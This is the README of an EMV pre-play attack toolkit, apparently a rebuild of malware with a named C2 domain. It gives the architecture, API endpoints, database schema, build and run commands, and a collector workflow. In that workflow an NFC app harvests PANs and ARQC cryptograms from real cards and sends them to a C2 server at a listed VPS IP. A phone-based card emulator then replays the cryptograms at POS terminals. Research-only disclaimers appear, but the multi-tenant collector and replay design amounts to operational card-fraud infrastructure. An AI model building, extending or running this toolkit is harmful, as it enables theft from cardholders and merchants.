# EMV Pre-Play Research Lab

## What this is

Enhanced reverse-engineering of a real-world EMV pre-play attack toolkit (`sample.apk`, C2 `tqqemv.xyz`).
The original used plain HTTP. This lab replaces that with WebSocket for persistent real-time connections.

**Research only. All testing uses own cards on a lab POS terminal. No live transactions.**

---

## Architecture

```
┌──────────────────────┐        WebSocket (ws://VPS:4444/ws)       ┌──────────────────────────┐
│   NFC Probe          │ ─────────────────────────────────────────▶ │  Research C2 (server.js) │
│  (nfc_reader_app)    │  {type:"harvest", pan, aid, harvested_txs} │  Node.js + SQLite        │
│                      │ ◀──────────────────────── {type:"config"}  │  VPS: 172.104.207.107    │
│  Taps real card with │                                             │  Port: 4444              │
│  NFC reader. Harvests│                                             │                          │
│  ARQC + UN pairs     │                                             │  Browser dashboard:      │
│  per profile/CVE.    │                                             │  http://VPS:4444         │
└──────────────────────┘                                             │                          │
                                                                     │  1. Researcher selects   │
┌──────────────────────┐        HTTP GET /api/replay?key=…          │     transactions         │
│   Moksha             │ ◀───────────────────────────────────────── │  2. Marks selected=1     │
│  (moksha app)        │        HTTP GET /api/sessions?key=…        │                          │
│                      │                                             └──────────────────────────┘
│  HCE service acts as │        HTTP POST /api/replay_result                    ▲
│  a payment card at   │ ─────────────────────────────────────────────────────▶│
│  POS terminal.       │  {un_hex, arqc_hex, hit, api_key}           SSE /events (live updates)
│  Returns pre-        │                                                        │
│  harvested ARQC for  │                                              Browser ──┘
│  matching UN.        │
└──────────────────────┘
```

---

## Components

### 1. NFC Probe (`research/nfc_reader_app/`)
- **Package:** `com.nfc.harvester` | **Label:** "NFC Probe"
- **What it does:** Reads a real contactless card (ISO 7816 APDU). Runs through every CVE profile
  (Visa/MC × INR/USD/GBP/EUR). Each profile executes 20 transactions to harvest UN→ARQC pairs.
- **Upload:** WebSocket `{type:"harvest", pan, aid, network, api_key, harvested_txs[{atc,arqc,time_ms,cve_id,params}]}`
- **Config pull:** Server pushes `{type:"config"}` on connect with CVE profiles.
- **Key file:** `HarvestDb.kt` — local SQLite cache; `WsClient.kt` — reconnecting WebSocket; `MainActivity.kt`

### 2. Research C2 (`research/lab/server.js`)
- **Stack:** Node.js 22+, Express, `ws`, `node:sqlite` (built-in, no npm install needed for sqlite)
- **DB path:** `/tmp/nfc_research.db`
- **Multi-tenant:** Each collector has an `api_key`. All harvested cards/transactions are tagged with `collector_id`.
- **Key endpoints (see API Contract below)**
- **Dashboard:** Browser UI at `http://VPS:4444` — login with api_key, filter by network/currency,
  select transactions, push to Moksha, see ⚡ HIT badges in real-time.

### 3. Moksha (`research/moksha/`)
- **Package:** `xyz.nfc.moksha` | **Label:** "Moksha"
- **What it does:** Android HCE (Host Card Emulation). Phone acts as a contactless card at POS terminal.
  - **OBSERVE mode** (default): Extracts UN from GENERATE AC, always returns SW 6985 (decline). No money moves.
  - **REPLAY mode** (armed): When UN matches a pre-loaded ARQC from C2, returns the real ARQC.
    The bank cryptogram check passes — pre-play attack proved in the lab.
- **Key file:** `HceObserverService.kt` — HCE state machine; `C2Client.kt` — HTTP to C2; `MainActivity.kt`

---

## API Contract

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `GET` | `/me` | — | Returns CVE profile config for probes |
| `POST` | `/harvest` | Bearer key (optional) | HTTP fallback harvest upload |
| `WS` | `/ws` | — | WebSocket — probe connects here |
| `GET` | `/api/sessions` | `?key=` | All cards+transactions for this collector |
| `GET` | `/api/replay` | `?key=` | Only `selected=1` transactions (Moksha pulls this) |
| `POST` | `/api/select` | body `api_key` | Mark transaction IDs as selected for replay |
| `POST` | `/api/replay_result` | body `api_key` | Moksha reports UN hit/miss after POS tap |
| `DELETE` | `/api/clear` | `?key=` | Delete all data for this collector |
| `GET` | `/events` | — | SSE stream for live dashboard updates |

### WebSocket message: `harvest`
```json
{
  "type": "harvest",
  "api_key": "research-1",
  "pan": "4111111111111111",
  "aid": "A000000003101001",
  "network": "Visa",
  "raw_data": {},
  "harvested_txs": [
    { "atc": "0042", "arqc": "1A2B3C4D5E6F7890", "time_ms": 412.5,
      "cve_id": 1, "params": { "9F37": "A1B2C3D4", "5F2A": "0826", ... } }
  ]
}
```

### POST `/api/replay_result`
```json
{ "un_hex": "A1B2C3D4", "arqc_hex": "1A2B3C4D5E6F7890", "hit": true, "api_key": "research-1" }
```

### GET `/api/sessions` response (per session/card)
```json
{
  "id": 1, "pan": "4111…1111", "aid": "A0000…", "network": "Visa",
  "ts": 1749234000, "sample_count": 20,
  "transactions": [
    { "id": 42, "atc": "0042", "arqc": "1A2B3C4D…", "un": "A1B2C3D4",
      "amount": "000000010000", "cve_id": 3, "params": {...},
      "last_hit": 1, "replay_attempts": 2 }
  ]
}
```

---

## Database Schema

```sql
collectors   (id, api_key UNIQUE, name, ts)
cards        (id, collector_id→collectors, pan, aid, network, raw_data, ts)
transactions (id, card_id→cards, atc, arqc, un_hex, time_ms, params JSON, cve_id, selected)
replay_log   (id, tx_id→transactions, un_hex, hit 0|1, ts, collector_id)
cves         (id, name, amount, mc_tags JSON, visa_tags JSON)
```

---

## How to Run

### C2 Server (VPS)
```bash
ssh root@172.104.207.107
cd /root/nfc/research/lab
node server.js
# Runs on :4444. DB at /tmp/nfc_research.db
# Dashboard: http://172.104.207.107:4444
```

Default api_key: **`research-1`** (auto-created on first harvest).

### NFC Probe (Android)
1. Build: `cd research/nfc_reader_app && JAVA_HOME=/Library/Java/JavaVirtualMachines/temurin-21.jdk/Contents/Home ./gradlew assembleDebug`
2. Install: `adb install -r app/build/outputs/apk/debug/app-debug.apk`
3. Open "NFC Probe" → tap real card to NFC reader → data appears in dashboard.

Note: UDP auto-discovery finds VPS at startup. If old local server was running on Mac port 4444,
stop it (`kill <pid>`) and clear app data (`pm clear com.nfc.harvester`) to reset cached server IP.

### Moksha (Android)
1. Build: `cd research/moksha && JAVA_HOME=/Library/Java/JavaVirtualMachines/temurin-21.jdk/Contents/Home ./gradlew assembleDebug`
2. Install: `adb install -r app/build/outputs/apk/debug/app-debug.apk`
3. Open "Moksha" → Research tab:
   - **📋 Pick session from C2** — browse sessions on C2, tap one to arm REPLAY mode.
   - **🔄 Sync from C2** — pulls all selected transactions.
   - Hold phone to POS terminal NFC reader.

---

## Collector Workflow (end-to-end)

1. **Enroll:** Set api_key in NFC Probe settings (default: `research-1`).
2. **Harvest:** Tap card with NFC Probe → data uploads to C2 via WebSocket.
3. **Select:** Open dashboard (`http://VPS:4444`), login with api_key. Check transactions to replay.
   Use filter chips to narrow by network/currency. Hit **⚡ Push to Moksha**.
4. **Arm Moksha:** In Moksha app → Research tab → "📋 Pick session from C2" → select session.
   Badge shows: `✅ 20 ARQCs  ●●●● 1234  •  REPLAY armed`.
5. **Replay:** Hold Moksha phone to lab POS terminal. For each GENERATE AC:
   - UN matches cache → ARQC returned → terminal proceeds → bank verifies.
   - UN not in cache → SW 6985 → terminal declines.
6. **Feedback:** Moksha posts `POST /api/replay_result` after each tap.
   Dashboard shows **⚡ HIT** or **✗ MISS** in real-time via SSE.

---

## Design Decisions

| Decision | Original (`sample.apk`) | This lab |
|----------|------------------------|----------|
| Harvest upload | HTTP POST `/harvest` | WebSocket `/ws` — persistent, real-time ACK |
| Config push | HTTP GET `/me` polled | WS `{type:"config"}` pushed on connect |
| Auth | `Authorization: Bearer <key>` header | Same + `api_key` in WS message body |
| Multi-tenant | Single collector | `collectors` table + per-collector data |
| Replay feedback | None | `POST /api/replay_result` → dashboard ⚡ badge |
| Dashboard | None documented | Live SSE + polling, filter chips, push UI |

---

## Security Boundaries

- **Own card only.** NFC Probe is used exclusively on cards you own.
- **OBSERVE mode always declines** (SW 6985). No money moves in observe mode.
- **REPLAY mode — lab POS only.** Never used on live terminals.
- HCE RECORD_RESPONSE returns minimal CDOL1 (`9F37` only) so terminals request only UN, no PIN bypass.
